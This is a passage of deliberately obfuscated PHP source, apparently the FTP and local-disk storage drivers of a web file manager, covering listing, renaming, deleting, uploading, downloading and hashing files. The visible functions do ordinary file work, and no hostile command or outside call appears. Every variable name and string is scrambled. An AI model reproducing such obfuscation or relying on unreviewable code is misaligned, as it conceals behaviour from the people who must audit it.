$ÙıôÊ×è = @ftp_delete($this->connect, $ô±ƒñ½ç); if (!$ÙıôÊ×è) { return !1; } } foreach ($åÆ²òÎ® as $ô±ƒñ½ç) { $ô±ƒñ½ç = $this->iconvSystem($ô±ƒñ½ç); $ÙıôÊ×è = @ftp_rmdir($this->connect, $ô±ƒñ½ç); if (!$ÙıôÊ×è) { return !1; } } $¤±ŠÑŸ = $this->iconvSystem($¤±ŠÑŸ); return @ftp_rmdir($this->connect, $¤±ŠÑŸ); } public function rename($¸¼Â‰Ø , $ƒÄ‰è) { $€™±çÕ‡ =& $_SERVER[”ôÑ§ì¸]; if (!$this->_isconn()) { return !1; } $º‚Áİ½å = $this->fileNameAuto($this->pathFather($¸¼Â‰Ø ), $ƒÄ‰è); $º‚Áİ½å = $this->iconvSystem($º‚Áİ½å); $¸¼Â‰Ø  = $this->iconvSystem($¸¼Â‰Ø ); $Û¾ç¿¥¯ = $this->pathFather($¸¼Â‰Ø ); $àëä˜¦­ = rtrim($Û¾ç¿¥¯, $€™±çÕ‡[8]) . $€™±çÕ‡[8] . $º‚Áİ½å; $¼Û½Ş° = @ftp_rename($this->connect, $¸¼Â‰Ø , $àëä˜¦­); $àëä˜¦­ = $this->iconvApp($àëä˜¦­); return $¼Û½Ş° ? $this->getPathOuter($àëä˜¦­) : !1; } private function folderInfo($Š³ñÜ¶³, $¸®ë²û = false) { $Ç‰–ı© =& $_SERVER[”ôÑ§ì¸]; $¢„”©“€ = array($Ç‰–ı©[32] => $this->pathThis($Š³ñÜ¶³), $Ç‰–ı©[84] => $this->getPathOuter($Ç‰–ı©[8] . $Š³ñÜ¶³), $Ç‰–ı©[33] => $Ç‰–ı©[75]); if ($¸®ë²û) { return $¢„”©“€; } $¢„”©“€[$Ç‰–ı©[214]] = $¢„”©“€[$Ç‰–ı©[85]] = 0; $¢„”©“€[$Ç‰–ı©[215]] = $¢„”©“€[$Ç‰–ı©[216]] = !0; return $¢„”©“€; } private function fileInfo($ÛĞŞ›·Ô, $ÔĞÑäª… = false, $ëªÒìŒÌ = array()) { $šØè­æ„ =& $_SERVER[”ôÑ§ì¸]; $¾°ô“îØ = array($šØè­æ„[32] => $this->pathThis($ÛĞŞ›·Ô), $šØè­æ„[84] => $this->getPathOuter($šØè­æ„[8] . $ÛĞŞ›·Ô), $šØè­æ„[33] => $šØè­æ„[213], $šØè­æ„[76] => isset($ëªÒìŒÌ[$šØè­æ„[76]]) ? $ëªÒìŒÌ[$šØè­æ„[76]] : 0, $šØè­æ„[174] => $this->ext($ÛĞŞ›·Ô)); if ($ÔĞÑäª…) { return $¾°ô“îØ; } $¾°ô“îØ[$šØè­æ„[214]] = $¾°ô“îØ[$šØè­æ„[85]] = 0; $¾°ô“îØ[$šØè­æ„[215]] = $¾°ô“îØ[$šØè­æ„[216]] = !0; $Ì¯¡¬º = $this->iconvSystem($ÛĞŞ›·Ô); $¾°ô“îØ[$šØè­æ„[85]] = @ftp_mdtm($this->connect, $Ì¯¡¬º); if (empty($ëªÒìŒÌ)) { $ëªÒìŒÌ = $this->objectMeta($ÛĞŞ›·Ô); if (!$ëªÒìŒÌ) { return $¾°ô“îØ; } } $¾°ô“îØ[$šØè­æ„[76]] = $ëªÒìŒÌ[$šØè­æ„[76]]; return $¾°ô“îØ; } public function size($‹“’µ¤ñ) { $ÄÈÓäø¦ = $this->objectMeta($‹“’µ¤ñ); return $ÄÈÓäø¦ ? $ÄÈÓäø¦[$_SERVER[”ôÑ§ì¸][76]] : 0; } public function info($â¼­­íú) { if ($this->isFile($â¼­­íú)) { return $this->fileInfo($â¼­­íú, 0); } else { if ($this->isFolder($â¼­­íú)) { return $this->folderInfo($â¼­­íú); } } return !1; } private function fileList($ÜŠ×Íó¥, &$¥ôÎÑµ†, &$½ÓÍáË, $Öñí§Ãª = false) { $÷ô®éµº =& $_SERVER[”ôÑ§ì¸]; $ÜŠ×Íó¥ = $this->iconvSystem($ÜŠ×Íó¥); if (!$this->isFolder($ÜŠ×Íó¥)) { return !1; } @ftp_chdir($this->connect, $÷ô®éµº[8]); $ÜŠ×Íó¥ = rtrim($ÜŠ×Íó¥, $÷ô®éµº[8]) . $÷ô®éµº[8]; check_abort(); $ä¼ßÍÒÄ = @ftp_rawlist($this->connect, $ÜŠ×Íó¥); if (!$ä¼ßÍÒÄ) { $ä¼ßÍÒÄ = array(); } $£šÚ” = array($÷ô®éµº[10] => 1, $÷ô®éµº[1310] => 1); foreach ($ä¼ßÍÒÄ as $ÖİİÊßĞ) { $¡í’Æîï = $this->_listItem($ÖİİÊßĞ); if ($¡í’Æîï[0] == $÷ô®éµº[780]) { continue; } $ÍäÚÏºÜ = $¡í’Æîï[8]; if (empty($ÍäÚÏºÜ) && $ÍäÚÏºÜ !== $÷ô®éµº[211] || isset($£šÚ”[$ÍäÚÏºÜ])) { continue; } $ÍäÚÏºÜ = $this->iconvApp($ÜŠ×Íó¥ . ltrim($ÍäÚÏºÜ, $÷ô®éµº[8])); $ò‰³©Éã = array($÷ô®éµº[32] => $ÍäÚÏºÜ, $÷ô®éµº[33] => $÷ô®éµº[213], $÷ô®éµº[76] => $¡í’Æîï[4]); if (substr($ÖİİÊßĞ, 0, 1) == $÷ô®éµº[1390]) { $ò‰³©Éã[$÷ô®éµº[33]] = $÷ô®éµº[75]; $ò‰³©Éã[$÷ô®éµº[76]] = 0; } $è­éßœ’ = $ò‰³©Éã[$÷ô®éµº[33]] == $÷ô®éµº[75] ? !0 : !1; $this->cacheMethodInfoSet($ÍäÚÏºÜ, $è­éßœ’, $ò‰³©Éã); if ($è­éßœ’) { $¥ôÎÑµ†[] = $ÍäÚÏºÜ; if ($Öñí§Ãª) { $this->fileList($ÍäÚÏºÜ, $¥ôÎÑµ†, $½ÓÍáË, $Öñí§Ãª); } continue; } $½ÓÍáË[] = $ò‰³©Éã; } $this->cacheMethodInfoSet($ÜŠ×Íó¥, !0); } private function _listItem($—¾Ò›İ‘) { if (empty($—¾Ò›İ‘)) { return array(); } $ç»°ä´é = preg_split($_SERVER[”ôÑ§ì¸][1391], $—¾Ò›İ‘); if (count($ç»°ä´é) <= 9) { return $ç»°ä´é; } $ç»°ä´é[8] = trim(substr($—¾Ò›İ‘, strpos($—¾Ò›İ‘, $ç»°ä´é[7]) + strlen($ç»°ä´é[7]))); return array_splice($ç»°ä´é, 0, 9); } public function listPath($Â£µ¬Û¾, $¼ô¹Ô”” = false) { $šîÖòùÈ =& $_SERVER[”ôÑ§ì¸]; if (!$this->_isconn()) { return !1; } $¥™§³õ = $‹áÄîşÉ = array(); $this->fileList($Â£µ¬Û¾, $¥™§³õ, $‹áÄîşÉ); foreach ($¥™§³õ as $‰çã ¸ => $µ˜™ŠŞ¯) { $¥™§³õ[$‰çã ¸] = $this->folderInfo($µ˜™ŠŞ¯, $¼ô¹Ô””); } foreach ($‹áÄîşÉ as $‰çã ¸ => $µ˜™ŠŞ¯) { $‹áÄîşÉ[$‰çã ¸] = $this->fileInfo($µ˜™ŠŞ¯[$šîÖòùÈ[32]], $¼ô¹Ô””, $µ˜™ŠŞ¯); } return array($šîÖòùÈ[82] => $¥™§³õ, $šîÖòùÈ[83] => $‹áÄîşÉ); } public function has($æœß§·¥, $ĞÑ™·ô­ = false, $åòá—Ç­ = true) { $‹§èÙñ’ =& $_SERVER[”ôÑ§ì¸]; $§Æ±ì£× = $’£ÙØªü = array(); $”Ö½ï‡  = $ĞÑ™·ô­ ? !0 : !1; $this->fileList($æœß§·¥, $§Æ±ì£×, $’£ÙØªü, $”Ö½ï‡ ); if ($ĞÑ™·ô­) { return array($‹§èÙñ’[222] => count($’£ÙØªü), $‹§èÙñ’[223] => count($§Æ±ì£×)); } if ($åòá—Ç­) { if (count($’£ÙØªü)) { return !0; } } else { if (count($§Æ±ì£×)) { return !0; } } return !1; } public function listAll($”ü¤¶…É) { $ğ¿£¯ƒ‹ =& $_SERVER[”ôÑ§ì¸]; if (!$this->_isconn()) { return !1; } $³ïÚ¬•ñ = $ñ˜ìÄùÏ = array(); $this->fileList($”ü¤¶…É, $³ïÚ¬•ñ, $ñ˜ìÄùÏ, !0); $÷Øø»Ø« = array_to_keyvalue($ñ˜ìÄùÏ, $ğ¿£¯ƒ‹[32]); foreach ($³ïÚ¬•ñ as $ÊÔ°Ù£) { if (is_string($ÊÔ°Ù£)) { $÷Øø»Ø«[$ÊÔ°Ù£] = array($ğ¿£¯ƒ‹[76] => 0); } } return $this->listAllFiles($”ü¤¶…É, $÷Øø»Ø«); } public function getContent($Ôõø•ØÏ) { if (!$this->_isconn()) { return !1; } $Ôõø•ØÏ = $this->iconvSystem($Ôõø•ØÏ); return $this->fileSubstr($Ôõø•ØÏ); } public function setContent($‘€ÆÉÙô, $¡ë³ÛÜÚ = '') { if (!$this->_isconn()) { return !1; } $šÙ×Á¤ë = $this->pathThis($this->iconvSystem($‘€ÆÉÙô)); $–ªí€ = $this->tempFile($šÙ×Á¤ë); file_put_contents($–ªí€, $¡ë³ÛÜÚ); $ƒö¹äÌ“ = $this->upload($‘€ÆÉÙô, $this->iconvApp($–ªí€)); $this->tempFileRemve($–ªí€); return $ƒö¹äÌ“; } public function fileSubstr($ÜåİÓØØ, $‹ÛÕĞõ“ = 0, $ˆ Ü•­ª = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÜåİÓØØ, $‹ÛÕĞõ“, $ˆ Ü•­ª); } private function ftpRequest($ò¥´í¼¡, $ô¯øä÷é = 0, $¡İÖ’ = false) { $ò¥´í¼¡ = $this->iconvSystem($ò¥´í¼¡); $¹’Õ†İã = $this->scheme . $this->host . $_SERVER[”ôÑ§ì¸][4] . $this->port; $¬Áé…Ì€ = curl_init(); curl_setopt($¬Áé…Ì€, CURLOPT_URL, $¹’Õ†İã . $this->pathEncode($ò¥´í¼¡)); curl_setopt($¬Áé…Ì€, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¡İÖ’) { $‰¤©­í¯ = $ô¯øä÷é + $¡İÖ’ - 1; curl_setopt($¬Áé…Ì€, CURLOPT_RANGE, "{$ô¯øä÷é}\x2d{$‰¤©­í¯}"); } curl_setopt($¬Áé…Ì€, CURLOPT_RETURNTRANSFER, 1); $ÄŒŒÃ©» = curl_exec($¬Áé…Ì€); curl_close($¬Áé…Ì€); return $ÄŒŒÃ©»; } public function upload($ì±Å’´”, $àÃĞÕ’, $Àï› = false, $Ü…¢÷Ÿ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ì±Å’´”))) { return !1; } $ì±Å’´” = $this->iconvSystem($ì±Å’´”); $àÃĞÕ’ = $this->iconvSystem($àÃĞÕ’); $Ó¨‡ëë‰ = ftp_nb_put($this->connect, $ì±Å’´”, $àÃĞÕ’, FTP_BINARY); while ($Ó¨‡ëë‰ == FTP_MOREDATA) { $Ó¨‡ëë‰ = ftp_nb_continue($this->connect); } if ($Ó¨‡ëë‰ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ì±Å’´”); } public function download($Éù°ëüå, $‰ôá… = '') { if (!$this->_isconn()) { return !1; } $»¹µÊ•ğ = $this->pathFather($‰ôá…); if (!IO::mkdir($»¹µÊ•ğ)) { return !1; } $Éù°ëüå = $this->iconvSystem($Éù°ëüå); $‰ôá… = $this->iconvSystem($‰ôá…); $½ú–ş¶ = ftp_nb_get($this->connect, $‰ôá…, $Éù°ëüå, FTP_BINARY); while ($½ú–ş¶ == FTP_MOREDATA) { $½ú–ş¶ = ftp_nb_continue($this->connect); } if ($½ú–ş¶ != FTP_FINISHED) { return !1; } return $this->iconvApp($‰ôá…); } public function exist($áµÆÌî) { return $this->isFile($áµÆÌî) || $this->isFolder($áµÆÌî); } public function isFile($ªî„ »Á) { return !$this->isFolder($ªî„ »Á) && $this->objectMeta($ªî„ »Á); } public function isFolder($ŠäÛ„ Û) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][165], $ŠäÛ„ Û); } protected function objectMeta($¾«üƒÓ”) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][167], $¾«üƒÓ”); } protected function _objectMeta($Š ßóÄà) { $°½ãÊÕä =& $_SERVER[”ôÑ§ì¸]; if ($Š ßóÄà == $°½ãÊÕä[12] || $Š ßóÄà == $°½ãÊÕä[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Š ßóÄà = $this->iconvSystem($Š ßóÄà); $ö±²”øî = array($°½ãÊÕä[32] => $this->iconvApp($Š ßóÄà), $°½ãÊÕä[33] => $°½ãÊÕä[213], $°½ãÊÕä[76] => 0); @ftp_chdir($this->connect, $°½ãÊÕä[8]); $×÷çà = @ftp_size($this->connect, $Š ßóÄà); if ($×÷çà != -1) { $ö±²”øî[$°½ãÊÕä[76]] = $×÷çà; } else { $ó·ğÉ’ = @ftp_chdir($this->connect, $Š ßóÄà); if (!$ó·ğÉ’) { return !1; } $ö±²”øî[$°½ãÊÕä[33]] = $°½ãÊÕä[75]; } return $ö±²”øî; } protected function _isFolder($şë¼ÚÀ) { $ø°İ¿âæ =& $_SERVER[”ôÑ§ì¸]; if ($şë¼ÚÀ == $ø°İ¿âæ[12] || $şë¼ÚÀ == $ø°İ¿âæ[8]) { return !0; } $öôöÄ‚Ã = $this->_objectMeta($şë¼ÚÀ); return isset($öôöÄ‚Ã[$ø°İ¿âæ[33]]) && $öôöÄ‚Ã[$ø°İ¿âæ[33]] == $ø°İ¿âæ[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ş¸œ¸åÄ) { if (substr($ş¸œ¸åÄ, 0, 2) == $_SERVER[”ôÑ§ì¸][1309]) { $ş¸œ¸åÄ = BASIC_PATH . substr($ş¸œ¸åÄ, 2); } return $ş¸œ¸åÄ; } public function iconvApp($ú´á¸´Ò) { $È¨…’ñ =& $_SERVER[”ôÑ§ì¸]; global $config; return $this->iconvTo($ú´á¸´Ò, $config[$È¨…’ñ[1382]], $config[$È¨…’ñ[1381]]); } public function iconvSystem($çü³ˆªó) { $ÔÔ¼”Àª =& $_SERVER[”ôÑ§ì¸]; global $config; return $this->iconvTo($çü³ˆªó, $config[$ÔÔ¼”Àª[1381]], $config[$ÔÔ¼”Àª[1382]]); } public function getPathOuter($óÇ¥Ä«û) { $ªµÚù²š =& $_SERVER[”ôÑ§ì¸]; $â×¼’ó = $this->iconvApp($this->pathBase); $óÇ¥Ä«û = $this->iconvApp($óÇ¥Ä«û); if (substr($â×¼’ó, 0, 2) == $ªµÚù²š[1309]) { $â×¼’ó = BASIC_PATH . substr($â×¼’ó, 2); } if (substr($óÇ¥Ä«û, 0, 2) == $ªµÚù²š[1309]) { $óÇ¥Ä«û = BASIC_PATH . substr($óÇ¥Ä«û, 2); } $â×¼’ó = KodIO::clear($â×¼’ó); $óÇ¥Ä«û = KodIO::clear($óÇ¥Ä«û); $óÇ¥Ä«û = substr($óÇ¥Ä«û, strlen($â×¼’ó)); if (empty($this->pathDriver)) { return $óÇ¥Ä«û; } return $this->pathDriver . $ªµÚù²š[8] . ltrim($óÇ¥Ä«û, $ªµÚù²š[8]); } public function mkfile($¿”ùıÔ, $™´À‚† = '', $¤Ô›Ù‘İ = REPEAT_RENAME) { $¿”ùıÔ = $this->iconvSystem($¿”ùıÔ); @touch($¿”ùıÔ); if ($™´À‚†) { file_put_contents($¿”ùıÔ, $™´À‚†); } @chmod($¿”ùıÔ, $this->pathAuth); return is_file($¿”ùıÔ) ? $this->getPathOuter($¿”ùıÔ) : !1; } public function mkdir($á¼ç¹æ¤, $³ÄâªØ¬ = REPEAT_SKIP) { $á¼ç¹æ¤ = $this->iconvSystem($á¼ç¹æ¤); if (is_dir($á¼ç¹æ¤)) { return $this->getPathOuter($á¼ç¹æ¤); } @mkdir($á¼ç¹æ¤, $this->pathAuth, !0); @chmod($á¼ç¹æ¤, $this->pathAuth); return is_dir($á¼ç¹æ¤) ? $this->getPathOuter($á¼ç¹æ¤) : !1; } public function copyFile($“Ã­– , $ø¨‰á„Ï) { $this->mkdir($this->pathFather($ø¨‰á„Ï)); $“Ã­–  = $this->iconvSystem($“Ã­– ); $ø¨‰á„Ï = $this->iconvSystem($ø¨‰á„Ï); $Ì´íšô = copy_64($“Ã­– , $ø¨‰á„Ï); @chmod($ø¨‰á„Ï, $this->pathAuth); return $Ì´íšô ? $this->getPathOuter($ø¨‰á„Ï) : !1; } public function moveFile($ÎÆ´ñ¸•, $ÇÊØ©„£) { $this->mkdir($this->pathFather($ÇÊØ©„£)); $ÎÆ´ñ¸• = $this->iconvSystem($ÎÆ´ñ¸•); $ÇÊØ©„£ = $this->iconvSystem($ÇÊØ©„£); $¢‹ë’Û = intval(@rename($ÎÆ´ñ¸•, $ÇÊØ©„£)); if (!$¢‹ë’Û) { if ($¢‹ë’Û = intval(@copy_64($ÎÆ´ñ¸•, $ÇÊØ©„£))) { @unlink($ÎÆ´ñ¸•); } } @chmod($ÇÊØ©„£, $this->pathAuth); return $¢‹ë’Û ? $this->getPathOuter($ÇÊØ©„£) : !1; } public function movePath($‘²‰è¦è, $Äó†Û£, $©ÓºĞÎÎ = false) { $à‘˜”™é =& $_SERVER[”ôÑ§ì¸]; $‘²‰è¦è = $this->iconvSystem($‘²‰è¦è); $Äó†Û£ = $this->iconvSystem($Äó†Û£); $×ûşé½î = rtrim($Äó†Û£, $à‘˜”™é[8]) . $à‘˜”™é[8] . ($©ÓºĞÎÎ ? $©ÓºĞÎÎ : get_path_this($‘²‰è¦è)); if (file_exists($×ûşé½î)) { return !1; } $‹äø´Ğ— = intval(@rename($‘²‰è¦è, $×ûşé½î)); $‹äø´Ğ— = file_exists($×ûşé½î); return $‹äø´Ğ— ? $this->getPathOuter($×ûşé½î) : !1; } public function delFile($õĞÀ˜— ) { $õĞÀ˜—  = $this->iconvSystem($õĞÀ˜— ); if (!@unlink($õĞÀ˜— )) { @chmod($õĞÀ˜— , $this->pathAuth); if (!@unlink($õĞÀ˜— )) { return !1; } } else { return !0; } } public function delFolder($ˆ³Î—û¶) { $§¬¾†Ö® =& $_SERVER[”ôÑ§ì¸]; $ˆ³Î—û¶ = $this->iconvSystem($ˆ³Î—û¶); if (!is_dir($ˆ³Î—û¶)) { return !0; } if (!($­–°œà€ = opendir($ˆ³Î—û¶))) { return !1; } while (($¼Íößìæ = readdir($­–°œà€)) !== !1) { if ($¼Íößìæ == $§¬¾†Ö®[10] || $¼Íößìæ == $§¬¾†Ö®[1310]) { continue; } $úë÷ûö = $ˆ³Î—û¶ . $§¬¾†Ö®[8] . $¼Íößìæ; if (is_file($úë÷ûö) || is_link($úë÷ûö)) { if (!unlink($úë÷ûö)) { chmod($úë÷ûö, $this->pathAuth); if (!unlink($úë÷ûö)) { return !1; } } } else { if (is_dir($úë÷ûö)) { chmod($úë÷ûö, $this->pathAuth); $úë÷ûö = $this->iconvApp($úë÷ûö); if (!$this->delFolder($úë÷ûö)) { return !1; } } } } closedir($­–°œà€); return rmdir($ˆ³Î—û¶); } public function rename($ƒµ³°±ˆ, $ú¯Œ²×ß) { $ëª‘¬ç =& $_SERVER[”ôÑ§ì¸]; $õ¿ó¸°Ö = $this->fileNameAuto($this->pathFather($ƒµ³°±ˆ), $ú¯Œ²×ß); $õ¿ó¸°Ö = $this->iconvSystem($õ¿ó¸°Ö); $ƒµ³°±ˆ = $this->iconvSystem($ƒµ³°±ˆ); $˜´ùò¿Ô = $this->pathFather($ƒµ³°±ˆ); $™¦±› = rtrim($˜´ùò¿Ô, $ëª‘¬ç[8]) . $ëª‘¬ç[8] . $õ¿ó¸°Ö; $¿ê¥Ï¡î = @rename($ƒµ³°±ˆ, $™¦±›); $™¦±› = $this->iconvApp($™¦±›); return $¿ê¥Ï¡î ? $this->getPathOuter($™¦±›) : !1; } public function size($º·şŞ³ˆ) { $º·şŞ³ˆ = $this->iconvSystem($º·şŞ³ˆ); return filesize_64($º·şŞ³ˆ); } public function info($ªŞ˜ê²ˆ) { $ªŞ˜ê²ˆ = $this->iconvSystem($ªŞ˜ê²ˆ); if ($this->isFolder($ªŞ˜ê²ˆ)) { return $this->folderInfo($ªŞ˜ê²ˆ); } else { if ($this->isFile($ªŞ˜ê²ˆ)) { return $this->fileInfo($ªŞ˜ê²ˆ); } } return !1; } protected function infoChildren($Ô‹²ÎÛã, &$âÕŠ³Ÿì, $½ôšÊÃ = true) { $“­£ÓÁ² =& $_SERVER[”ôÑ§ì¸]; check_abort_echo(); $Ô‹²ÎÛã = rtrim($Ô‹²ÎÛã, $“­£ÓÁ²[8]) . $“­£ÓÁ²[8]; if ($½ôšÊÃ) { $Ô‹²ÎÛã = $this->iconvSystem($Ô‹²ÎÛã); } if (!($ÍöÕİÁİ = @opendir($Ô‹²ÎÛã))) { return; } while (($ÅìØÃæÓ = readdir($ÍöÕİÁİ)) !== !1) { if ($ÅìØÃæÓ == $“­£ÓÁ²[10] || $ÅìØÃæÓ == $“­£ÓÁ²[1310]) { continue; } $ÊÄÒÁŸ = $Ô‹²ÎÛã . $ÅìØÃæÓ; if (is_file($ÊÄÒÁŸ) || is_link($ÊÄÒÁŸ)) { $âÕŠ³Ÿì[$“­£ÓÁ²[77]]++; $âÕŠ³Ÿì[$“­£ÓÁ²[76]] += filesize_64($ÊÄÒÁŸ); } else { if (is_dir($ÊÄÒÁŸ)) { $âÕŠ³Ÿì[$“­£ÓÁ²[78]]++; $this->infoChildren($ÊÄÒÁŸ, $âÕŠ³Ÿì, !1); } } } closedir($ÍöÕİÁİ); } private function folderInfo($Û’ÅÆÙ, $Ú›Æ¨ëö = false) { $²ƒñ¶÷ =& $_SERVER[”ôÑ§ì¸]; $Û’ÅÆÙ = rtrim($Û’ÅÆÙ, $²ƒñ¶÷[8]) . $²ƒñ¶÷[8]; $ùÑ•ªŸ— = $this->iconvApp($this->pathThis($Û’ÅÆÙ)); if ($Ú›Æ¨ëö) { return array($²ƒñ¶÷[32] => $ùÑ•ªŸ—, $²ƒñ¶÷[84] => $this->getPathOuter($Û’ÅÆÙ), $²ƒñ¶÷[33] => $²ƒñ¶÷[75]); } $ßó¿°¹® = array($²ƒñ¶÷[32] => $ùÑ•ªŸ—, $²ƒñ¶÷[84] => $this->getPathOuter($Û’ÅÆÙ), $²ƒñ¶÷[33] => $²ƒñ¶÷[75], $²ƒñ¶÷[214] => @filectime($Û’ÅÆÙ), $²ƒñ¶÷[85] => @filemtime($Û’ÅÆÙ), $²ƒñ¶÷[1392] => @fileatime($Û’ÅÆÙ), $²ƒñ¶÷[1393] => is_readable($Û’ÅÆÙ), $²ƒñ¶÷[1394] => is_writable($Û’ÅÆÙ), $²ƒñ¶÷[1395] => get_mode($Û’ÅÆÙ)); return $ßó¿°¹®; } private function fileInfo($‰¦±¦å„, $‘å§å–¢ = false) { $‹¼û¹‹Û =& $_SERVER[”ôÑ§ì¸]; $“•òëå• = $this->iconvApp($this->pathThis($‰¦±¦å„)); if ($‘å§å–¢) { return array($‹¼û¹‹Û[32] => $“•òëå•, $‹¼û¹‹Û[84] => $this->getPathOuter($‰¦±¦å„), $‹¼û¹‹Û[33] => $‹¼û¹‹Û[213], $‹¼û¹‹Û[76] => $this->size($‰¦±¦å„), $‹¼û¹‹Û[174] => $this->ext($“•òëå•)); } $û®›§± = array($‹¼û¹‹Û[32] => $“•òëå•, $‹¼û¹‹Û[84] => $this->getPathOuter($‰¦±¦å„), $‹¼û¹‹Û[33] => $‹¼û¹‹Û[213], $‹¼û¹‹Û[214] => @filectime($‰¦±¦å„), $‹¼û¹‹Û[85] => @filemtime($‰¦±¦å„), $‹¼û¹‹Û[1392] => @fileatime($‰¦±¦å„), $‹¼û¹‹Û[76] => $this->size($‰¦±¦å„), $‹¼û¹‹Û[174] => $this->ext($“•òëå•), $‹¼û¹‹Û[1393] => is_readable($‰¦±¦å„), $‹¼û¹‹Û[1394] => is_writable($‰¦±¦å„), $‹¼û¹‹Û[1395] => get_mode($‰¦±¦å„)); return $û®›§±; } public function exist($â¸ôèÌí) { $â¸ôèÌí = $this->iconvSystem($â¸ôèÌí); return @file_exists($â¸ôèÌí); } public function isFile($¶…”´ı‡) { $¶…”´ı‡ = $this->iconvSystem($¶…”´ı‡); return @is_file($¶…”´ı‡); } public function isFolder($õ¬‘ û·) { $õ¬‘ û· = $this->iconvSystem($õ¬‘ û·); return @is_dir($õ¬‘ û·); } public function listPath($ØŠëš­º, $ú½°€…ï = false) { $ß©ôÜøï =& $_SERVER[”ôÑ§ì¸]; $ØŠëš­º = $this->iconvSystem($ØŠëš­º); $ØŠëš­º = rtrim($ØŠëš­º, $ß©ôÜøï[8]) . $ß©ôÜøï[8]; $À¡¹—µ¦ = array($ß©ôÜøï[82] => array(), $ß©ôÜøï[83] => array()); if (!($ª¾§‚§© = @opendir($ØŠëš­º))) { return $À¡¹—µ¦; } while (($ş¦‘÷š = readdir($ª¾§‚§©)) !== !1) { if ($ş¦‘÷š == $ß©ôÜøï[10] || $ş¦‘÷š == $ß©ôÜøï[1310]) { continue; } $·–ÊÈŞ§ = $ØŠëš­º . $ş¦‘÷š; if (is_file($·–ÊÈŞ§)) { $À¡¹—µ¦[$ß©ôÜøï[83]][] = $this->fileInfo($·–ÊÈŞ§, $ú½°€…ï); } else { $À¡¹—µ¦[$ß©ôÜøï[82]][] = $this->folderInfo($·–ÊÈŞ§, $ú½°€…ï); } } closedir($ª¾§‚§©); return $À¡¹—µ¦; } public function listAll($²ëàÑöÁ, &$Â¸ÎÛ˜½ = array()) { $ºÏáµæº =& $_SERVER[”ôÑ§ì¸]; $²ëàÑöÁ = $this->iconvSystem($²ëàÑöÁ); $²ëàÑöÁ = rtrim($²ëàÑöÁ, $ºÏáµæº[8]) . $ºÏáµæº[8]; if (!($ßæ¶‚ÈÇ = @opendir($²ëàÑöÁ))) { return $Â¸ÎÛ˜½; } while (($¥Õ“Ûñû = readdir($ßæ¶‚ÈÇ)) !== !1) { if ($¥Õ“Ûñû == $ºÏáµæº[10] || $¥Õ“Ûñû == $ºÏáµæº[1310]) { continue; } $ıŒ«ûó = $²ëàÑöÁ . $¥Õ“Ûñû; $à‡ÀğòË = is_dir($ıŒ«ûó) && !is_link($ıŒ«ûó) ? 1 : 0; $ıŒ«ûó = $à‡ÀğòË ? $ıŒ«ûó . $ºÏáµæº[8] : $ıŒ«ûó; $Â¸ÎÛ˜½[] = array($ºÏáµæº[84] => $ıŒ«ûó, $ºÏáµæº[75] => $à‡ÀğòË, $ºÏáµæº[85] => intval(@filemtime($ıŒ«ûó)), $ºÏáµæº[76] => $à‡ÀğòË ? 0 : intval($this->size($ıŒ«ûó))); if ($à‡ÀğòË) { $this->listAll($ıŒ«ûó, $Â¸ÎÛ˜½); } } closedir($ßæ¶‚ÈÇ); return $Â¸ÎÛ˜½; } public function has($±ü†âÁ, $ƒ¼ÒÙı¶ = false, $¶å™Ğ²û = true) { $Î˜ˆ¶˜Ò =& $_SERVER[”ôÑ§ì¸]; $±ü†âÁ = $this->iconvSystem($±ü†âÁ); $±ü†âÁ = rtrim($±ü†âÁ, $Î˜ˆ¶˜Ò[8]) . $Î˜ˆ¶˜Ò[8]; if (!($¨ßõÎ€å = @opendir($±ü†âÁ))) { return !1; } $ Ëªâ» = 0; $ï†àÊ·ş = 0; $İ–÷ã¨œ = 0; while (($Œ™ “º = readdir($¨ßõÎ€å)) !== !1) { if ($Œ™ “º == $Î˜ˆ¶˜Ò[10] || $Œ™ “º == $Î˜ˆ¶˜Ò[1310]) { continue; } $¦±Ñ€ñ‘ = $±ü†âÁ . $Œ™ “º; if ($ƒ¼ÒÙı¶) { $İ–÷ã¨œ++; if (@is_file($¦±Ñ€ñ‘)) { $ Ëªâ»++; } else { $ï†àÊ·ş++; } if ($İ–÷ã¨œ > 10000) { break; } continue; } if ($¶å™Ğ²û) { if (@is_file($¦±Ñ€ñ‘)) { return !0; } } else { if (@is_dir($¦±Ñ€ñ‘ . $Î˜ˆ¶˜Ò[8])) { return !0; } } } closedir($¨ßõÎ€å); if ($ƒ¼ÒÙı¶) { return array($Î˜ˆ¶˜Ò[222] => $ Ëªâ», $Î˜ˆ¶˜Ò[223] => $ï†àÊ·ş); } return !1; } public function hashSimple($–¢¥—ÈÒ) { $éµğ‘ôÉ =& $_SERVER[”ôÑ§ì¸]; if (!$–¢¥—ÈÒ) { return md5($éµğ‘ôÉ[12]); } $–¢¥—ÈÒ = $this->iconvSystem($–¢¥—ÈÒ); $ÒËà«·¬ = $this->size($–¢¥—ÈÒ); $òë—³ = 200; $ïÓã‘¯ = 50; if ($ÒËà«·¬ <= $òë—³ * $ïÓã‘¯) { return $this->hashMd5($–¢¥—ÈÒ) . $ÒËà«·¬; } $ÎÖ÷ªÄ± = $éµğ‘ôÉ[12]; $Ê¦•‰Ë« = intval($ÒËà«·¬ / $ïÓã‘¯); $«åÇ•Öè = fopen($–¢¥—ÈÒ, $éµğ‘ôÉ[1396]); if (!$«åÇ•Öè) { return $ÎÖ÷ªÄ±; } for ($ËÙÓÅä = 0; $ËÙÓÅä < $ïÓã‘¯; $ËÙÓÅä++) { fseek_64($«åÇ•Öè, $Ê¦•‰Ë« * $ËÙÓÅä); $ÎÖ÷ªÄ± .= fread($«åÇ•Öè, $òë—³); } fseek_64($«åÇ•Öè, $ÒËà«·¬ - $òë—³); $ÎÖ÷ªÄ± .= fread($«åÇ•Öè, $òë—³); fclose($«åÇ•Öè); return md5($ÎÖ÷ªÄ±) . $ÒËà«·¬; } public function getContent($ÄšÔëÑò) { $ÄšÔëÑò = $this->iconvSystem($ÄšÔëÑò); return file_get_contents($ÄšÔëÑò); } public function setContent($’½½ÉÏÆ, 